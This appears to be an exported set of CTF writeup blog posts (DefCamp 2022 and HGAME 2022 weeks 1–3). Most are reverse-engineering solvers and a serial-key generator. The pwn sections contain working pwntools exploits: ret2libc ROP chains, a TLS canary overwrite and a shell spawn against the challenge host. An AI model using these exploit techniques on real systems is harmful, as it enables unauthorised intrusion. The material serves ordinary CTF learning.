[{"content":"can-you-crack-this The main function reads the input and constrains the length.\nv11 = std::operator\u0026lt;\u0026lt;\u0026lt;std::char_traits\u0026lt;char\u0026gt;\u0026gt;(\u0026amp;std::cout, \u0026#34;Enter your public key: \u0026#34;); std::ostream::operator\u0026lt;\u0026lt;(v11, std::endl\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;\u0026gt;); std::operator\u0026gt;\u0026gt;\u0026lt;char\u0026gt;(\u0026amp;std::cin, public_key); if ( (unsigned __int64)std::string::length(public_key) \u0026gt;= 20 ) { v9 = std::operator\u0026lt;\u0026lt;\u0026lt;std::char_traits\u0026lt;char\u0026gt;\u0026gt;(\u0026amp;std::cout, \u0026#34;Enter serial key:\u0026#34;); std::ostream::operator\u0026lt;\u0026lt;(v9, std::endl\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;\u0026gt;); std::operator\u0026gt;\u0026gt;\u0026lt;char\u0026gt;(\u0026amp;std::cin, serial_key); v8 = 4 * std::string::length(public_key) - 1; if ( v8 == std::string::length(serial_key) ) { std::string::basic_string(str_public_key, public_key); std::string::basic_string(str_serial_key, serial_key); v6 = verify_serial((__int64)str_public_key, (__int64)str_serial_key); std::string::~string(str_serial_key); std::string::~string(str_public_key); if ( v6 ) { v5 = std::operator\u0026lt;\u0026lt;\u0026lt;std::char_traits\u0026lt;char\u0026gt;\u0026gt;(\u0026amp;std::cout, \u0026#34;Serial accepted.\u0026#34;); std::ostream::operator\u0026lt;\u0026lt;(v5, std::endl\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;\u0026gt;); } else { v4 = std::operator\u0026lt;\u0026lt;\u0026lt;std::char_traits\u0026lt;char\u0026gt;\u0026gt;(\u0026amp;std::cout, \u0026#34;Try harder.\u0026#34;); std::ostream::operator\u0026lt;\u0026lt;(v4, std::endl\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;\u0026gt;); } v17 = 0; v14 = 1; } else { v7 = std::operator\u0026lt;\u0026lt;\u0026lt;std::char_traits\u0026lt;char\u0026gt;\u0026gt;(\u0026amp;std::cout, \u0026#34;Invalid serial length.\u0026#34;); std::ostream::operator\u0026lt;\u0026lt;(v7, std::endl\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;\u0026gt;); v17 = 0; v14 = 1; } } else { v10 = std::operator\u0026lt;\u0026lt;\u0026lt;std::char_traits\u0026lt;char\u0026gt;\u0026gt;(\u0026amp;std::cout, \u0026#34;Invalid length.\u0026#34;); std::ostream::operator\u0026lt;\u0026lt;(v10, std::endl\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;\u0026gt;); v17 = 0; v14 = 1; } It requires that the two input strings satisfy the constraint len(serial) = len(publik_key) * 4 - 1 and passes the two strings into the verify_serial() function.\n_BOOL8 __fastcall verify_serial(__int64 a1, __int64 a2) { __int64 v2; // rsi  __int64 v3; // rax  const char *v4; // rax  __int64 v6; // [rsp+10h] [rbp-C0h]  bool v7; // [rsp+1Bh] [rbp-B5h]  char *char_from_pb_key; // [rsp+20h] [rbp-B0h]  char v10[24]; // [rsp+38h] [rbp-98h] BYREF  char sub_serial[28]; // [rsp+50h] [rbp-80h] BYREF  int v12; // [rsp+6Ch] [rbp-64h]  __int64 count; // [rsp+70h] [rbp-60h]  char sub_serial_v12[24]; // [rsp+88h] [rbp-48h] BYREF  __int64 pos_v13; // [rsp+A0h] [rbp-30h]  __int64 v16; // [rsp+A8h] [rbp-28h]  char v17[28]; // [rsp+B0h] [rbp-20h] BYREF  _BOOL4 v18; // [rsp+CCh] [rbp-4h]  std::string::basic_string\u0026lt;std::nullptr_t\u0026gt;(v17, \u0026#34;-\u0026#34;); v16 = 0LL; pos_v13 = 0LL; std::string::basic_string((__int64)sub_serial_v12); count = 0LL; while ( 1 ) { pos_v13 = std::string::find(a2, v17, 0LL); if ( pos_v13 == -1 ) break; ++count; if ( pos_v13 != 3 ) { v18 = 0; v12 = 1; goto L_EXIT; } std::string::substr(sub_serial, a2, 0LL, 3LL); std::string::operator=((__int64)sub_serial_v12, (__int64)sub_serial); std::string::~string(sub_serial); std::string::basic_string(v10, sub_serial_v12); v2 = v16++; char_from_pb_key = (char *)std::string::at(a1, v2); v7 = !verify_char(v10, *char_from_pb_key); std::string::~string(v10); if ( v7 ) { v18 = 0; v12 = 1; goto L_EXIT; } v6 = pos_v13; v3 = std::string::length(v17); std::string::erase(a2, 0LL, v3 + v6); } if ( count == 19 ) { v4 = (const char *)std::string::c_str(a2); v18 = strncmp(v4, \u0026#34;bss\u0026#34;, 3uLL) == 0; } else { v18 = 0; } v12 = 1; L_EXIT: std::string::~string(sub_serial_v12); std::string::~string(v17); return v18; } This function splits the Serial Key into 20 parts by - and requires each part to be 3 in length, ending with bss.\nThe three characters of each Serial Key part and one Public Key character in the corresponding position are passed to the verify_char() function.\n_BOOL8 __fastcall verify_char(char *a1, char a2) { const char *v2; // rax  int v3; // eax  unsigned __int64 v5; // [rsp+0h] [rbp-20h]  __int64 v6; // [rsp+8h] [rbp-18h]  __int64 v7; // [rsp+10h] [rbp-10h]  v2 = (const char *)std::string::c_str(a1); v7 = strtol(v2, 0LL, 16); v6 = fib(v7); // fib / 100  v5 = v6; do { do --v5; while ( !check_arm(v5) ); } while ( (unsigned int)notused(v5) || v5 \u0026gt; 0x10E47F4C575565LL ); if ( v7 \u0026gt;= 100 ) { if ( (unsigned int)isprint(a2) ) { v3 = UN++; used[v3] = v5; return v5 \u0026amp;\u0026amp; v6 \u0026amp;\u0026amp; v5 != v6 \u0026amp;\u0026amp; (v6 - v5) % 100 == a2; } } return 0; } This function first converts the hex string (format of input) to int, then uses fib() to calculate the value of that index in the Fibonacci series and divides it by 100 to return v6.\nThe check_arm() function is as follows\n_BOOL8 __fastcall check_arm(__int64 a1) { return (countSetBits(a1) \u0026amp; 1) == 1; } __int64 __fastcall countSetBits(__int64 a1) { unsigned int v2; // [rsp+0h] [rbp-Ch]  v2 = 0; while ( a1 ) { a1 \u0026amp;= a1 - 1; ++v2; } return v2; } countSetBits() is used to calculate the number of 1 in the binary form of the argument, so the number of 1 is odd to exit the inner do while loop. For the outer loop, the number v5 must be less than 0x10E47F4C575565, and notused() will record the previous v5 and cannot be reused.\nIn addition, since v6 - v5 \u0026gt; 0x20 (isprint(a2) and (v6 - v5) % 100 == a2) is required, it is obvious that the upper limit of v5 needs to be used in the construction. So that the value of v5 in 20 calculations can be determined, and the Serial Key and Public Key can be constructed by finding (v6, a2) that match the condition.\n#include \u0026lt;stdio.h\u0026gt; unsigned long long fib(unsigned long long x) { long long v5[4096]; v5[0] = 0; v5[1] = 1; for (int i = 2; i \u0026lt;= x; i++) v5[i] = v5[i - 1] + v5[i - 2]; return v5[x] / 100uLL; } long long countSetBits(long long x) { unsigned int v2 = 0; while (x) { x \u0026amp;= x - 1; v2++; } return v2; } int check_arm(unsigned long long x) { return (countSetBits(x) \u0026amp; 1) == 1; } void next(long long *v5) { do { --*v5; } while (!check_arm(*v5)); return; } int main() { unsigned long long v7; long long v5 = 0x10E47F4C575565LL; int serial[105]; int public[105]; for (int i = 0; i \u0026lt; 20; i++){ next(\u0026amp;v5); for (int j = 100; j \u0026lt; 0x1000; j++){ long long tmp = (fib(j) - v5) % 100; // add constraints of fib(j) \u0026gt; 0x10E47F4C575565LL is better  if (tmp \u0026gt; 0x20){ serial[i] = j; public[i] = tmp; break; } } } printf(\u0026#34;Public Key: \u0026#34;); for (int i = 0; i \u0026lt; 20; i++) printf(\u0026#34;%c\u0026#34;, public[i]); printf(\u0026#34;\\n\u0026#34;); printf(\u0026#34;Serial Key: \u0026#34;); for (int i = 0; i \u0026lt; 19; i++) printf(\u0026#34;%03x-\u0026#34;, serial[i]); printf(\u0026#34;bss\\n\u0026#34;); return 0; } // Public Key: ;=\u0026gt;ABDGH#%\u0026amp;(+-.12479 // Serial Key: 066-066-066-066-066-066-066-066-064-064-064-064-064-064-064-064-064-064-064-bss ","date":"2022-02-14T23:08:32+08:00","image":"/post/defcamp2022-can-you-crack-this-wp/cover_huce52bdd0a85d719a9e95a81ea04327da_778452_120x120_fill_q75_box_smart1.jpg","permalink":"/post/defcamp2022-can-you-crack-this-wp/","title":"DefCamp2022 can-you-crack-this Writeup"},{"content":"Week1 [RE]easyasm 题目说 asm，那就硬看汇编呗\n循环右移 4 位，然后异或 0x17\ncipher = [ 0x91, 0x61, 0x01, 0xC1, 0x41, 0xA0, 0x60, 0x41, 0xD1, 0x21, 0x14, 0xC1, 0x41, 0xE2, 0x50, 0xE1, 0xE2, 0x54, 0x20, 0xC1, 0xE2, 0x60, 0x14, 0x30, 0xD1, 0x51, 0xC0, 0x17 ] def ror(x): return (x \u0026gt;\u0026gt; 4) | (x \u0026lt;\u0026lt; 4) \u0026amp; 0xff for c in cipher: print (chr(ror(c ^ 0x17)), end=\u0026#39;\u0026#39;) # hgame{welc0me_to_4sm_w0rld} [RE]creakme int __cdecl main(int argc, const char **argv, const char **envp) { int v3; // edx  int i; // esi  unsigned int v5; // edi  unsigned int v6; // ebx  int v7; // esi  int v8; // esi  _DWORD v10[17]; // [esp+Ch] [ebp-8Ch] BYREF  _BYTE v11[32]; // [esp+50h] [ebp-48h]  char Arglist[32]; // [esp+70h] [ebp-28h] BYREF  int v13; // [esp+90h] [ebp-8h]  int v14; // [esp+94h] [ebp-4h]  memset(Arglist, 0, sizeof(Arglist)); sub_40103A(\u0026#34;%s\u0026#34;, (char)Arglist); strcpy((char *)v10, \u0026#34;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=\u0026#34;); v3 = 0; v14 = 0; for ( i = 0; i \u0026lt; 32; v14 = i ) { v5 = *(_DWORD *)\u0026amp;Arglist[i]; v6 = *(_DWORD *)\u0026amp;Arglist[i + 4]; v13 = 0; v7 = 32; do { v3 += 0x12345678; v5 += v3 ^ (v3 + v6) ^ (v10[2] + 16 * v6) ^ (v10[3] + (v6 \u0026gt;\u0026gt; 5)); v6 += v3 ^ (v3 + v5) ^ (v10[0] + 16 * v5) ^ (v10[1] + (v5 \u0026gt;\u0026gt; 5)); --v7; } while ( v7 ); v8 = v14; v3 = 0; *(_DWORD *)\u0026amp;Arglist[v14] = v5; *(_DWORD *)\u0026amp;Arglist[v8 + 4] = v6; i = v8 + 8; } *(_OWORD *)v11 = *(_OWORD *)dword_402180; *(_OWORD *)\u0026amp;v11[16] = dword_402170; while ( Arglist[v3] == v11[v3] ) { if ( ++v3 \u0026gt;= 32 ) { sub_40100C(\u0026#34;right!\u0026#34;, v10[0]); return 0; } } sub_40100C(\u0026#34;wrong!\u0026#34;, v10[0]); return 0; } 那一串字符串看似和 Base64 有关，其实加密就是 TEA\n#include \u0026lt;stdio.h\u0026gt;#include \u0026lt;stdint.h\u0026gt; void decrypt (uint32_t* v, uint32_t* k) { uint32_t delta=0x12345678; uint32_t v0=v[0], v1=v[1], sum=delta * 32, i; uint32_t k0=k[0], k1=k[1], k2=k[2], k3=k[3]; for (i=0; i\u0026lt;32; i++) { v1 -= sum ^ ((v0\u0026lt;\u0026lt;4) + k0) ^ (v0 + sum) ^ ((v0\u0026gt;\u0026gt;5) + k1); v0 -= sum ^ ((v1\u0026lt;\u0026lt;4) + k2) ^ (v1 + sum) ^ ((v1\u0026gt;\u0026gt;5) + k3); sum -= delta; } v[0]=v0; v[1]=v1; } int main() { uint32_t v[]={1222194312u, 51123276u, 1391163586u, 3986482669u, 2921328102u, 3126465133u, 3482485930u, 1709241059u},k[4]={0x44434241,0x48474645,0x4c4b4a49,0x504f4e4d}; decrypt(v, k); decrypt(v + 2, k); decrypt(v + 4, k); decrypt(v + 8, k); printf(\u0026#34;%s\u0026#34;, v); return 0; } [RE]Flag Checker jeb 打开\npackage com.example.flagchecker; import android.os.Bundle; import android.support.v7.app.AppCompatActivity; import android.util.Base64; import android.view.View.OnClickListener; import android.view.View; import android.widget.Button; import android.widget.EditText; import android.widget.Toast; import javax.crypto.Cipher; import javax.crypto.spec.SecretKeySpec; public class MainActivity extends AppCompatActivity { public static byte[] encrypt(String arg4, String arg5) throws Exception { SecretKeySpec v0 = new SecretKeySpec(arg5.getBytes(), 0, arg5.length(), \u0026#34;RC4\u0026#34;); Cipher v5 = Cipher.getInstance(\u0026#34;RC4\u0026#34;); v5.init(1, v0); return v5.doFinal(arg4.getBytes()); } @Override // android.support.v7.app.AppCompatActivity  protected void onCreate(Bundle arg2) { super.onCreate(arg2); this.setContentView(0x7F09001C); // layout:activity_main  ((Button)this.findViewById(0x7F070022)).setOnClickListener(new View.OnClickListener() { // id:button  @Override // android.view.View$OnClickListener  public void onClick(View arg4) { String v4 = ((EditText)MainActivity.this.findViewById(0x7F070036)).getText().toString(); // id:editTextTextPersonName  byte[] v2 = new byte[0]; try { v2 = MainActivity.encrypt(v4, \u0026#34;carol\u0026#34;); } catch(Exception v4_1) { v4_1.printStackTrace(); } if(Base64.encodeToString(v2, 0).replace(\u0026#34;\\n\u0026#34;, \u0026#34;\u0026#34;).equals(\u0026#34;mg6CITV6GEaFDTYnObFmENOAVjKcQmGncF90WhqvCFyhhsyqq1s=\u0026#34;)) { Toast.makeText(MainActivity.this, \u0026#34;Congratulations!!!\u0026#34;, 1).show(); return; } Toast.makeText(MainActivity.this, \u0026#34;Fail,try again.\u0026#34;, 1).show(); } }); } } RC4 + Base64\nfrom base64 import * from Crypto.Cipher import ARC4 cipher = b64decode(b\u0026#39;mg6CITV6GEaFDTYnObFmENOAVjKcQmGncF90WhqvCFyhhsyqq1s=\u0026#39;) key = b\u0026#39;carol\u0026#39; rc4 = ARC4.new(key) rc4.decrypt(cipher) # b\u0026#39;hgame{weLC0ME_To-tHE_WORLD_oF-AnDr0|D}\u0026#39; [RE]猫头鹰是不是猫 做了两次矩阵乘法，求解方法是先把两个常数矩阵乘起来，然后用 z3 求解\n[Pwn]enter_the_pwn_land 经典 ret2libc\nfrom pwn import * context(os=\u0026#39;linux\u0026#39;, arch=\u0026#39;amd64\u0026#39;, log_level=\u0026#39;debug\u0026#39;) p = remote(\u0026#34;chuj.top\u0026#34;, 34671) # p = process(b\u0026#39;./a.out\u0026#39;) pop_rdi_ret = 0x401313 pop_rsi_r15_ret = 0x401311 puts_got = 0x404020 puts_plt = 0x401090 test_thread = 0x4011B6 main = 0x401260 ret = 0x40101a pre_payload = b\u0026#39;a\u0026#39; * (0x30 - 0x4) + b\u0026#39;\\x2c\u0026#39; + b\u0026#39;\\x00\u0026#39; * 3 + b\u0026#39;b\u0026#39; * 8 payload = pre_payload + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main) p.sendline(payload) p.recvline() puts_addr = u64(p.recvline()[:-1] + b\u0026#39;\\x00\\x00\u0026#39;) print (hex(puts_addr)) puts_offset = 0x875A0 binsh_offset = 0x1B75AA system_offset = 0x55410 libc_addr = puts_addr - puts_offset binsh_addr = libc_addr + binsh_offset system_addr = libc_addr + system_offset payload = pre_payload + p64(ret) + p64(pop_rdi_ret) + p64(binsh_addr) + p64(system_addr) p.sendline(payload) p.recvline() p.interactive() [Pwn]enter_the_evil_pwn_land 这道题目的难点在于 Canary 的绕过，用到了一个 ptrace 的特性，Canary 存储在 TLS 中，ptrace 时 TLS 距离栈较近，所以只需要疯狂往后覆盖就行，我这里覆盖了 0x900 位\nfrom pwn import * context(os=\u0026#39;linux\u0026#39;, arch=\u0026#39;amd64\u0026#39;, log_level=\u0026#39;debug\u0026#39;) p = remote(\u0026#34;chuj.top\u0026#34;, 35131) # p = process(\u0026#39;./a.out\u0026#39;) pop_rdi_ret = 0x401363 pop_rsi_r15_ret = 0x401361 puts_got = 0x404020 puts_plt = 0x4010A0 test_thread = 0x4011D6 main = 0x4012A3 ret = 0x40101a # gdb.attach(p, \u0026#39;thread 2\\nb *0x401245\u0026#39;) pre_payload = b\u0026#39;a\u0026#39; * 0x28 + b\u0026#39;c\u0026#39; * 8 + b\u0026#39;b\u0026#39; * 8 payload = p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(test_thread) p.sendline(pre_payload + payload + b\u0026#39;c\u0026#39; * 0x900) print (p.recvline()) puts_addr = u64(p.recvline()[:-1] + b\u0026#39;\\x00\\x00\u0026#39;) puts_offset = 0x875A0 binsh_offset = 0x1B75AA execv_offset = 0xE6450 libc_addr = puts_addr - puts_offset binsh_addr = libc_addr + binsh_offset execv_addr = libc_addr + execv_offset payload = p64(ret) + p64(pop_rdi_ret) + p64(binsh_addr) + p64(pop_rsi_r15_ret) + p64(0) + p64(0) + p64(execv_addr) p.sendline(pre_payload + payload + b\u0026#39;c\u0026#39; * 0x900) p.interactive()  此外，这题还学到了 gdb 调试 threads 的技巧 info threads 可以查看当前的线程，thread i 可以切换到第 i 个线程\n [Pwn]test_your_gdb 先调试拿到 password，然后就是简单的 ret2text 了\nfrom pwn import * context(os=\u0026#39;linux\u0026#39;, arch=\u0026#39;amd64\u0026#39;, log_level=\u0026#39;debug\u0026#39;) # p = process(b\u0026#39;./a.out\u0026#39;) p = remote(\u0026#34;chuj.top\u0026#34;, 50748) payload = b\u0026#39;\\x47\\xf1\\x94\\x82\\x0e\\x1e\\x36\\xb0\\xa9\\xa6\\xd8\\x4e\\xc3\\xe0\\x09\\x8c\u0026#39; # gdb.attach(p) p.recvuntil(b\u0026#39;pass word\\n\u0026#39;) p.send(payload) p.recv(0x18) canary = p.recv(8) p.recv(0x100 - 0x20) payload = b\u0026#39;a\u0026#39; * 0x18 + canary + b\u0026#39;b\u0026#39; * 8 + p64(0x401256) p.sendline(payload) p.interactive() Week2 [RE]xD MAZE 一维的迷宫，直接用 vscode 的小技巧转成 flag\n选中 512 个 # 和后面的一个空格，然后 CTRL+SHIFT+L 全选，换成 3，以此类推\n[RE]upx magic 0 把所有可见字符都算一遍，然后映射回去就行\ndef crc(x): x \u0026lt;\u0026lt;= 8 for i in range(8): if x \u0026amp; 0x8000 != 0: x = (x * 2) ^ 0x1021 else: x *= 2 x \u0026amp;= 0xffff return x a = [] for i in range(0x0, 0x80): a.append(crc(i)) cipher = [ 0x8D68, 0x9D49, 0x2A12, 0xAB1A, 0xCBDC, 0xB92B, 0x2E32, 0x9F59, 0xDDCD, 0x9D49, 0xA90A, 0xE70, 0xF5CF, 0xA50, 0x5AF5, 0xFF9F, 0x9F59, 0xBD0B, 0x58E5, 0x3823, 0xBF1B, 0x78A7, 0xAB1A, 0x48C4, 0xA90A, 0x2C22, 0x9F59, 0x5CC5, 0x5ED5, 0x78A7, 0x2672, 0x5695 ] for c in cipher: print (chr(a.index(c)), end=\u0026#39;\u0026#39;) # noW_YOu~koNw-UPx~mAG|C_@Nd~crC16 [RE]upx magic 1 发现没法自动脱壳，010 打开之后，手动把三个 UPX? 改成 UPX!，之后就能自动脱壳了\n[RE]fake shell RC4 + init 更换密钥\ntarget = [ 0xB6, 0x94, 0xFA, 0x8F, 0x3D, 0x5F, 0xB2, 0xE0, 0xEA, 0x0F, 0xD2, 0x66, 0x98, 0x6C, 0x9D, 0xE7, 0x1B, 0x08, 0x40, 0x71, 0xC5, 0xBE, 0x6F, 0x6D, 0x7C, 0x7B, 0x09, 0x8D, 0xA8, 0xBD, 0xF3, 0xF6 ] from Crypto.Cipher import ARC4 rc4 = ARC4.new(b\u0026#39;w0wy0ugot1t\u0026#39;) rc4.decrypt(bytes(target)) # b\u0026#39;hgame{s0meth1ng_run_bef0r_m4in?}\u0026#39; 或者直接动调也行\n[RE]creakme2 在加密函数里看一下汇编，发现用了 try except 来构造了一个除 0 异常，当最高位为 0 时，异或一个 0x1234567\n#include \u0026lt;stdio.h\u0026gt;#include \u0026lt;stdint.h\u0026gt; void encipher(unsigned int num_rounds, uint32_t v[2], uint32_t const key[4]) { unsigned int i; uint32_t v0=v[0], v1=v[1], sum=0, delta=0x9E3779B1; for (i=0; i \u0026lt; num_rounds; i++) { v0 += (((v1 \u0026lt;\u0026lt; 4) ^ (v1 \u0026gt;\u0026gt; 5)) + v1) ^ (sum + key[sum \u0026amp; 3]); sum += delta; if (sum \u0026gt;\u0026gt; 31 == 0) sum ^= 0x1234567; printf(\u0026#34;%x\\n\u0026#34;, sum); v1 += (((v0 \u0026lt;\u0026lt; 4) ^ (v0 \u0026gt;\u0026gt; 5)) + v0) ^ (sum + key[(sum\u0026gt;\u0026gt;11) \u0026amp; 3]); } v[0]=v0; v[1]=v1; printf(\u0026#34;%x\\n\u0026#34;, sum); } void decipher(unsigned int num_rounds, uint32_t v[2], uint32_t const key[4]) { unsigned int i; uint32_t v0=v[0], v1=v[1], delta=0x9E3779B1, sum=0xc78e4d05; for (i=0; i \u0026lt; num_rounds; i++) { v1 -= (((v0 \u0026lt;\u0026lt; 4) ^ (v0 \u0026gt;\u0026gt; 5)) + v0) ^ (sum + key[(sum\u0026gt;\u0026gt;11) \u0026amp; 3]); if (sum \u0026gt;\u0026gt; 31 == 0) sum ^= 0x1234567; sum -= delta; printf(\u0026#34;%x\\n\u0026#34;, sum); v0 -= (((v1 \u0026lt;\u0026lt; 4) ^ (v1 \u0026gt;\u0026gt; 5)) + v1) ^ (sum + key[sum \u0026amp; 3]); } v[0]=v0; v[1]=v1; } int main() { uint32_t v[]={0x457E62CF, 0x9537896C, 0x1F7E7F72, 0xF7A073D8, 0x8E996868, 0x40AFAF99, 0xF990E34, 0x196F4086}; uint32_t const k[4]={1,2,3,4}; unsigned int r=32; decipher(r, v, k); decipher(r, v + 2, k); decipher(r, v + 4, k); decipher(r, v + 6, k); printf(\u0026#34;%s\\n\u0026#34;,v); return 0; } [Crypto]The Password Plus Pro Max Ultra 进行了一下数学推导\n\r\n结论就是做 64 次加密就回来了\n\r\n最后求解\nfrom functools import reduce from operator import xor from random import sample from re import findall from libnum import s2n def move(n, k): s = bin(n)[2:].zfill(64) k \u0026amp;= 63 return int(s[k:] + s[:k], 2) def encrypt(x, ks): return xor(x, reduce(xor, map(lambda k: move(x, k), ks))) def decrypt(x, ks): for _ in range(63): x = encrypt(x, ks) return x ks = [[8, 35], [19, 29, 30, 45], [6, 16, 18, 21, 44, 55], [10, 26, 30, 46, 51, 54, 58, 63], [5, 13, 25, 29, 37, 39, 43, 52, 53, 59], [1, 26, 31, 39, 40, 41, 43, 45, 49, 52, 54, 62], [8, 12, 19, 20, 30, 32, 34, 40, 41, 45, 46, 49, 55, 58], [2, 3, 5, 6, 8, 10, 15, 19, 26, 27, 33, 40, 42, 47, 52, 61], [1, 16, 17, 27, 28, 30, 32, 36, 37, 38, 39, 48, 49, 51, 55, 57, 59, 62], [5, 11, 12, 20, 22, 23, 25, 27, 31, 32, 33, 37, 44, 45, 49, 52, 53, 59, 61, 62], [2, 7, 10, 12, 18, 19, 20, 22, 26, 29, 33, 34, 38, 40, 41, 45, 46, 51, 54, 56, 57, 60], [3, 4, 5, 9, 12, 13, 18, 19, 21, 23, 24, 25, 30, 33, 34, 35, 37, 39, 43, 44, 46, 49, 50, 53], [1, 3, 6, 7, 10, 11, 13, 14, 23, 27, 32, 33, 35, 37, 39, 41, 46, 48, 49, 50, 51, 53, 54, 56, 58, 62]] xs = [2656224875120172108 , 1261711348908201279 , 18219282869614004824, 15279054981769814589, 7966355346882200701 , 5641592208539483808 , 1502927090219059154 , 3996223120734273799 , 18295033054788808618, 18126228466291248047, 9413762634844369954 , 8964324149921197550 , 6962485320551449848 ] from libnum import n2s for i in range(len(xs)): y = decrypt(xs[i], ks[i]) print (n2s(y).decode(), end=\u0026#39;\u0026#39;) # hgame{XOr|RoR\u0026amp;rOl|Is+vERY#coMmon*BiTwisE$OPeraTiOn*IT@is%oFten,ENCOUntErED*in.syMMeTRic?encryPtION} 据说这个加密方法和求逆多项式还有关系，很神奇\nWeek3 [RE]Answer\u0026rsquo;s windows 使用 right.png 字符串能够定位到验证函数\n动调发现使用了 string 的存储方式（好像就是把 string 内联了），只使用了 Base64 编码\n但 base 表和目标对应不上，显然是有反调试，自己做的时候直接猜到了真实表是 ascii 的前 64 个可见字符\n或者根据交叉引用找到 debug，把反调试判断 nop 掉再动调即可\n\r\n[RE]creakme_3 PPC 架构，用 ghidra 看的\nundefined4 main(void) { int fs; int randnum; int j; int order_cnt; int i; int order [89]; int canary; canary = *(int *)(fs + -0x7008); memset(order,0,0x164); printf(\u0026#34;Welcome my whitegive re task! This is your flag: \u0026#34;); do { for (j = 0; j \u0026lt; 0x59; j = j + 1) { randnum = rand(); order[j] = randnum % 0x59; } order_cnt = 1; while ((order_cnt \u0026lt; 0x59 \u0026amp;\u0026amp; (a[order[order_cnt + -1] * 2 + 1] \u0026lt;= a[order[order_cnt] * 2 + 1]))) { order_cnt = order_cnt + 1; } } while (order_cnt != 0x59); for (i = 0; i \u0026lt; 0x59; i = i + 1) { putchar(a[order[i] * 2]); } if (canary == *(int *)(fs + -0x7008)) { return 0; } /* WARNING: Subroutine does not return */ __stack_chk_fail(); } 手动恢复了一下符号，简单的说就是只有满足顺序都是 \u0026lt;= 的时候才能退出第一个循环，所以 rand() 只是个忽悠人并且浪费时间的东西（后来知道这个东西叫猴子加密）\n所以提取一下数字然后排序就行\na = [ (0x30, 0x4E7D), (0x30, 0x67BD), (0x30, 0x7A48), (0x30, 0x82A2), (0x30, 0x933E), (0x31, 0x9C18), (0x32, 0x5AFF), (0x32, 0x6CD7), (0x32, 0xA6CA), (0x32, 0xBD79), (0x32, 0xCEBD), (0x33, 0x324A), (0x33, 0x3292), (0x33, 0x3905), (0x33, 0x4291), (0x33, 0x5ADE), (0x33, 0x6E9F), (0x33, 0xA52A), (0x33, 0xBE35), (0x33, 0xCB63), (0x35, 0x7F3B), (0x38, 0x3914), (0x38, 0xB2AD), (0x39, 0x38DA), (0x39, 0x4E50), (0x39, 0x6A02), (0x39, 0xB10F), (0x42, 0x78E5), (0x5F, 0x7EF6), (0x5F, 0x89A3), (0x5F, 0x8EBD), (0x5F, 0x95E3), (0x61, 0x73DA), (0x64, 0x538C), (0x64, 0x633B), (0x64, 0x9E9C), (0x64, 0xB78B), (0x64, 0xC866), (0x65, 0x32AE), (0x65, 0x7679), (0x66, 0x2AE7), (0x66, 0x4D6A), (0x66, 0x5708), (0x66, 0x6610), (0x66, 0xA258), (0x66, 0xB80C), (0x66, 0xC885), (0x67, 0x710A), (0x67, 0x7CF4), (0x68, 0x3F76), (0x68, 0x702B), (0x68, 0xA3EE), (0x68, 0xAD50), (0x68, 0xBAC7), (0x69, 0x4024), (0x69, 0x8A22), (0x69, 0xC055), (0x6A, 0x2B52), (0x6A, 0xC687), (0x6B, 0x5F00), (0x6B, 0xC417), (0x6C, 0x6182), (0x6D, 0x75DB), (0x6E, 0x3C61), (0x6E, 0x4996), (0x6E, 0x5DC1), (0x6F, 0x2D76), (0x6F, 0x7D17), (0x6F, 0xA91B), (0x70, 0x9AED), (0x72, 0x45D0), (0x72, 0x8467), (0x72, 0xAB5D), (0x73, 0x5083), (0x73, 0x6222), (0x73, 0x8D93), (0x73, 0x923A), (0x73, 0x971E), (0x73, 0xB4BA), (0x73, 0xC785), (0x74, 0x3558), (0x74, 0x86BD), (0x74, 0x9738), (0x75, 0x3710), (0x75, 0x9779), (0x77, 0x2F3F), (0x77, 0x44DD), (0x7B, 0x78E1), (0x7D, 0x9F42) ] def takeSecond(elem): return elem[1] a.sort(key=takeSecond) for i in a: print (chr(i[0]), end=\u0026#39;\u0026#39;) # fjow33etu938nhi3wrnf90sdf32nklsdf0923hgame{B0go_50rt_is_s0_stup1d}fh32orh98sdfh23ikjsdf32 [RE]fishman pyd逆向\n定位函数 搜索字符串，能看到几个函数名\n\r\n比如 init 函数就是 sub_180002670\n密码算法识别+求解 查看一下 init 和 check 函数，这题使用的是 blowfish 密码，之前没有遇到过，所以是靠着 findcrypt 脚本识别出来的\n顺便放一下搜到的加密算法源码，来源是 https://gitee.com/miao123456miao/blowfish2（github 连不上，呜呜呜）\n这是一个分组密码，主要的特征就是 f 函数\n剩下的也没什么特别的，贴一下求解脚本吧\n ddl 师傅发现这个在 kali 上编译后会出现乱码，主要原因在于 kali 上编译后会把 low 放在低地址而 Ubuntu 会放在高地址，所以直接 write(1, \u0026amp;high, 8) 就无法打印到 low，修改为 write(1, \u0026amp;high, 4); write(1, \u0026amp;low, 4); 就能解决这个问题。\n #include \u0026lt;stdio.h\u0026gt;#include \u0026lt;stdlib.h\u0026gt;#include \u0026lt;unistd.h\u0026gt; #include \u0026#34;blowfish.h\u0026#34; void swap(uint32_t* a, uint32_t* b) { uint32_t tmp; tmp = *a; *a = *b; *b = tmp; } uint32_t blowfish_f(blowfish_t* container, uint32_t input) { uint8_t a, b, c, d; a = input \u0026gt;\u0026gt; 24; b = (input \u0026gt;\u0026gt; 16) \u0026amp; 0xff; c = (input \u0026gt;\u0026gt; 8) \u0026amp; 0xff; d = input \u0026amp; 0xff; return ((container-\u0026gt;s[0][a] + container-\u0026gt;s[1][b]) ^ container-\u0026gt;s[2][c]) + container-\u0026gt;s[3][d]; } void blowfish_cipher(blowfish_t* container, uint32_t* xl, uint32_t* xr, uint8_t mode) { int i; uint32_t loc_xl, loc_xr; loc_xl = *xl; loc_xr = *xr; if(mode == BLOWFISH_ENCRYPT) { for(i = 0; i \u0026lt; PASSES; i++) { loc_xl = loc_xl ^ container-\u0026gt;p[i]; loc_xr = blowfish_f(container, loc_xl) ^ loc_xr; swap(\u0026amp;loc_xl, \u0026amp;loc_xr); } } else if(mode == BLOWFISH_DECRYPT) { for(i = PASSES+1; i \u0026gt; 1; i--) { loc_xl = loc_xl ^ container-\u0026gt;p[i]; loc_xr = blowfish_f(container, loc_xl) ^ loc_xr; swap(\u0026amp;loc_xl, \u0026amp;loc_xr); } } swap(\u0026amp;loc_xl, \u0026amp;loc_xr); if(mode == 